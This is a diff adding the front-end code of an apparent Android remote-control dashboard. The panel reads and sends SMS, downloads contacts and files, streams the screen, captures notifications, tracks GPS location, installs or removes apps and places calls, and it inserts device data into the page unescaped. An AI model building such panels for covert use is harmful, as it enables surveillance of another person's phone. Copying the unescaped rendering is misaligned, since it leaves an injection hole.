+}
+
+// Screen
+function startScreen() {
+    socket.emit('start_screen', { quality: parseInt(document.getElementById('screenQuality').value) });
+}
+function stopScreen() {
+    socket.emit('stop_screen');
+    document.getElementById('screenStream').style.display = 'none';
+    document.getElementById('screenPlaceholder').style.display = 'block';
+}
+function pressBack() { socket.emit('press_back'); }
+function pressHome() { socket.emit('press_home'); }
+function pressRecents() { socket.emit('press_recents'); }
+
+function setupScreenTouch() {
+    const img = document.getElementById('screenStream');
+    let isDragging = false, startX, startY;
+
+    img.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        const rect = img.getBoundingClientRect();
+        startX = e.clientX - rect.left;
+        startY = e.clientY - rect.top;
+        e.preventDefault();
+    });
+
+    img.addEventListener('mousemove', (e) => {
+        // handled in mouseup
+    });
+
+    img.addEventListener('mouseup', (e) => {
+        const rect = img.getBoundingClientRect();
+        const endX = e.clientX - rect.left;
+        const endY = e.clientY - rect.top;
+        const displayW = rect.width;
+        const displayH = rect.height;
+
+        const dist = Math.sqrt((endX-startX)**2 + (endY-startY)**2);
+
+        if (dist < 10) {
+            // Tap
+            const scaleX = (startX / displayW) * phoneWidth;
+            const scaleY = (startY / displayH) * phoneHeight;
+            socket.emit('screen_touch', { x: scaleX, y: scaleY, phoneW: phoneWidth, phoneH: phoneHeight });
+        } else {
+            // Swipe
+            const sx1 = (startX / displayW) * phoneWidth;
+            const sy1 = (startY / displayH) * phoneHeight;
+            const sx2 = (endX / displayW) * phoneWidth;
+            const sy2 = (endY / displayH) * phoneHeight;
+            socket.emit('screen_swipe', { x1: sx1, y1: sy1, x2: sx2, y2: sy2, phoneW: phoneWidth, phoneH: phoneHeight });
+        }
+        isDragging = false;
+    });
+
+    // Touch events for mobile dashboard
+    img.addEventListener('touchstart', (e) => {
+        const touch = e.touches[0];
+        const rect = img.getBoundingClientRect();
+        startX = touch.clientX - rect.left;
+        startY = touch.clientY - rect.top;
+        e.preventDefault();
+    });
+
+    img.addEventListener('touchend', (e) => {
+        const touch = e.changedTouches[0];
+        const rect = img.getBoundingClientRect();
+        const endX = touch.clientX - rect.left;
+        const endY = touch.clientY - rect.top;
+        const displayW = rect.width;
+        const displayH = rect.height;
+
+        const dist = Math.sqrt((endX-startX)**2 + (endY-startY)**2);
+        if (dist < 10) {
+            const scaleX = (startX / displayW) * phoneWidth;
+            const scaleY = (startY / displayH) * phoneHeight;
+            socket.emit('screen_touch', { x: scaleX, y: scaleY, phoneW: phoneWidth, phoneH: phoneHeight });
+        } else {
+            const sx1 = (startX / displayW) * phoneWidth;
+            const sy1 = (startY / displayH) * phoneHeight;
+            const sx2 = (endX / displayW) * phoneWidth;
+            const sy2 = (endY / displayH) * phoneHeight;
+            socket.emit('screen_swipe', { x1: sx1, y1: sy1, x2: sx2, y2: sy2, phoneW: phoneWidth, phoneH: phoneHeight });
+        }
+    });
+}
+
+// SMS
+function loadSms() { socket.emit('get_sms'); }
+function renderSms(messages) {
+    const list = document.getElementById('smsList');
+    list.innerHTML = messages.sort((a,b) => b.date - a.date).map(m => `
+        <div class="msg-item">
+            <span class="msg-type ${m.type}">${m.type}</span>
+            <span class="msg-addr">${m.address}</span>
+            <div class="msg-body">${m.body}</div>
+            <div class="msg-time">${new Date(m.date).toLocaleString()}</div>
+        </div>
+    `).join('');
+}
+function sendSms() {
+    const phone = document.getElementById('smsPhone').value;
+    const message = document.getElementById('smsMessage').value;
+    if (!phone || !message) return alert('Fill phone and message');
+    socket.emit('send_sms', { phone, message });
+    document.getElementById('smsMessage').value = '';
+}
+
+// Contacts
+function loadContacts() { socket.emit('get_contacts'); }
+function downloadContacts() { socket.emit('download_contacts'); }
+function renderContacts(contacts) {
+    const list = document.getElementById('contactList');
+    list.innerHTML = contacts.map(c => `
+        <div class="contact-item">
+            <div>
+                <div class="contact-name">${c.name}</div>
+                <div class="contact-phone">${c.phone}</div>
+            </div>
+            <div class="contact-actions">
+                <button class="btn btn-sm btn-success" onclick="makeCallTo('${c.phone}')">📞</button>
+                <button class="btn btn-sm btn-primary" onclick="smsTo('${c.phone}')">💬</button>
+            </div>
+        </div>
+    `).join('');
+}
+function filterContacts() {
+    const q = document.getElementById('contactSearch').value.toLowerCase();
+    const filtered = allContacts.filter(c =>
+        c.name.toLowerCase().includes(q) || c.phone.includes(q));
+    renderContacts(filtered);
+}
+function makeCallTo(phone) {
+    socket.emit('make_call', { phone });
+}
+function smsTo(phone) {
+    switchTab('messages');
+    document.getElementById('smsPhone').value = phone;
+    document.getElementById('smsMessage').focus();
+}
+
+// Files
+function browseFiles(path) { socket.emit('browse_files', { path: path || '/' }); }
+function goParentDir() {
+    const parts = currentFilePath.split('/');
+    parts.pop();
+    const parent = parts.join('/') || '/';
+    browseFiles(parent);
+}
+function renderFiles(files) {
+    const list = document.getElementById('fileList');
+    list.innerHTML = files.map(f => `
+        <div class="file-item" ${f.isDirectory ? `ondblclick="browseFiles('${f.path.replace(/'/g,"\\'")}')"` : ''}>
+            <span class="file-icon">${f.isDirectory ? '📁' : (f.isImage ? '🖼️' : (f.isApk ? '📦' : '📄'))}</span>
+            <span class="file-name" ${f.isDirectory ? `onclick="browseFiles('${f.path.replace(/'/g,"\\'")}')"` : ''}>${f.name}</span>
+            <span class="file-size">${f.isDirectory ? '' : formatSize(f.size)}</span>
+            <div class="file-actions">
+                ${f.isImage ? `<button class="btn btn-sm btn-secondary" onclick="previewImage('${f.path.replace(/'/g,"\\'")}')">👁</button>` : ''}
+                ${!f.isDirectory ? `<button class="btn btn-sm btn-primary" onclick="downloadFile('${f.path.replace(/'/g,"\\'")}')">📥</button>` : ''}
+                ${f.isApk ? `<button class="btn btn-sm btn-success" onclick="installApk('${f.path.replace(/'/g,"\\'")}')">📲 Install</button>` : ''}
+                <button class="btn btn-sm btn-danger" onclick="deleteFile('${f.path.replace(/'/g,"\\'")}')">🗑</button>
+            </div>
+        </div>
+    `).join('');
+    if (!files.length) list.innerHTML = '<p style="padding:20px;color:var(--text2)">Empty folder</p>';
+}
+function downloadFile(path) {
+    document.getElementById('downloadProgress').style.display = 'block';
+    document.getElementById('downloadPercent').textContent = '0%';
+    document.getElementById('downloadFill').style.width = '0%';
+    socket.emit('download_file', { path });
+}
+function previewImage(path) { socket.emit('preview_image', { path }); }
+function deleteFile(path) {
+    if (!confirm('Delete this file?')) return;
+    socket.emit('delete_file', { path });
+}
+function installApk(path) { socket.emit('install_apk', { path }); }
+function uploadFile() {
+    const input = document.getElementById('fileUploadInput');
+    const file = input.files[0];
+    if (!file) return;
+
+    document.getElementById('uploadProgress').style.display = 'block';
+    const reader = new FileReader();
+    reader.onload = (e) => {
+        const base64 = btoa(String.fromCharCode(...new Uint8Array(e.target.result)));
+        socket.emit('upload_file', {
+            path: currentFilePath,
+            fileName: file.name,
+            data: base64
+        });
+        document.getElementById('uploadFill').style.width = '100%';
+    };
+    reader.readAsArrayBuffer(file);
+    input.value = '';
+}
+function closeImageModal() {
+    document.getElementById('imageModal').classList.remove('active');
+}
+
+// Apps
+function loadApps() { socket.emit('get_apps'); }
+function renderApps(apps) {
+    const list = document.getElementById('appList');
+    list.innerHTML = apps.map(a => `
+        <div class="app-item">
+            ${a.icon ? `<img src="data:image/png;base64,${a.icon}">` : '<div style="width:36px;height:36px;background:var(--bg4);border-radius:8px;display:flex;align-items:center;justify-content:center">📱</div>'}
+            <div class="app-name">
+                <span>${a.name}</span>
+                <small>${a.packageName}</small>
+            </div>
+            ${a.fromPlayStore ? '<span class="badge playstore">Play Store</span>' : ''}
+            ${a.isSystemApp ? '<span class="badge system">System</span>' : ''}
+            <button class="btn btn-sm btn-primary" onclick="socket.emit('open_app',{packageName:'${a.packageName}'})">Open</button>
+            ${!a.isSystemApp ? `<button class="btn btn-sm btn-danger" onclick="uninstallApp('${a.packageName}')">Uninstall</button>` : ''}
+        </div>
+    `).join('');
+}
+function filterApps() {
+    const q = document.getElementById('appSearch').value.toLowerCase();
+    const filtered = allApps.filter(a =>
+        a.name.toLowerCase().includes(q) || a.packageName.toLowerCase().includes(q));
+    renderApps(filtered);
+}
+function uninstallApp(pkg) {
+    if (!confirm('Uninstall ' + pkg + '?')) return;
+    socket.emit('uninstall_app', { packageName: pkg });
+}
+
+// Notifications
+function addNotification(data) {
+    const list = document.getElementById('notifList');
+    if (list.querySelector('p')) list.innerHTML = '';
+    const div = document.createElement('div');
+    div.className = 'notif-item';
+    div.innerHTML = `
+        <div class="notif-app">${data.package}</div>
+        <div class="notif-title">${data.title || ''}</div>
+        <div class="notif-text">${data.text || ''}</div>
+        <div class="notif-time">${new Date(data.time || Date.now()).toLocaleString()}</div>
+    `;
+    list.insertBefore(div, list.firstChild);
+}
+function clearNotifications() {
+    document.getElementById('notifList').innerHTML = '<p style="color:var(--text2);font-size:13px">Cleared</p>';
+}
+
+// Remote Control
+function showToast() {
+    const msg = document.getElementById('toastMsg').value;
+    if (!msg) return;
+    socket.emit('show_toast', { message: msg });
+    document.getElementById('toastMsg').value = '';
+}
+function openUrl() {
+    const url = document.getElementById('remoteUrl').value;
+    if (!url) return;
+    socket.emit('open_url', { url });
+}
+function makeCall() {
+    const phone = document.getElementById('callNumber').value;
+    if (!phone) return;
+    socket.emit('make_call', { phone });
+}
+
+// Device Info
+function loadDeviceInfo() {
+    socket.emit('get_device_info');
+    socket.emit('get_location');
+}
+function renderDeviceInfo(data) {
+    const grid = document.getElementById('infoGrid');
+    grid.innerHTML = `
+        <div class="info-card">
+            <div class="info-label">Device</div>
+            <div class="info-value" style="font-size:14px">${data.model}</div>
+        </div>
+        <div class="info-card">
+            <div class="info-label">Android Version</div>
+            <div class="info-value">${data.androidVersion} (SDK ${data.sdkVersion})</div>
+        </div>
+        <div class="info-card">
+            <div class="info-label">Battery</div>
+            <div class="info-value">${data.batteryLevel}% ${data.isCharging ? '⚡' : '🔋'}</div>
+        </div>
+        <div class="info-card">
+            <div class="info-label">Network</div>
+            <div class="info-value" style="font-size:14px">${data.networkType}: ${data.networkName}</div>
+        </div>
+        <div class="info-card">
+            <div class="info-label">Storage</div>
+            <div class="info-value" style="font-size:14px">${formatSize(data.storageUsed*1024*1024)} / ${formatSize(data.storageTotal*1024*1024)}<br>Free: ${formatSize(data.storageFree*1024*1024)}</div>
+        </div>
+        <div class="info-card">
+            <div class="info-label">Current App</div>
+            <div class="info-value" style="font-size:12px">${data.currentApp}</div>
+        </div>
+        <div class="info-card">
+            <div class="info-label">Screen</div>
+            <div class="info-value">${data.screenOn ? '🟢 On' : '🔴 Off'}</div>
+        </div>
+        <div class="info-card" id="locationCard">
+            <div class="info-label">Location</div>
+            <div class="info-value" style="font-size:13px"></div>
+        </div>
+    `;
+}
+function renderLocation(data) {
+    const card = document.getElementById('locationCard');
+    if (card && !data.error) {
+        card.innerHTML = `
+            <div class="info-label">Location</div>
+            <div class="info-value" style="font-size:13px;cursor:pointer" onclick="window.open('https://www.google.com/maps?q=${data.latitude},${data.longitude}','_blank')">
+                📍 ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}
+                <div style="font-size:10px;color:var(--text2);margin-top:4px">Click to open in Google Maps • Atvuracy: ${data.accuracy?.toFixed(0)}m</div>
+            </div>
+        `;
+    } else if (card) {
+        card.querySelector('.info-value').textContent = data.error || 'Unavailable';
+    }
+}
+
+// Helpers
+function formatSize(bytes) {
+    if (bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+
+function downloadBase64File(base64, fileName, mimeType) {
+    const link = document.createElement('a');
+    link.href = 'data:' + mimeType + ';base64,' + base64;
+    link.download = fileName;
+    link.click();
+}
+
+// Init - auto connect if URL has key param
+const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.get('key')) {
+    document.getElementById('keyInput').value = urlParams.get('key');
+    connectWithKey();
+}
+</script>
+</body>
+</html>
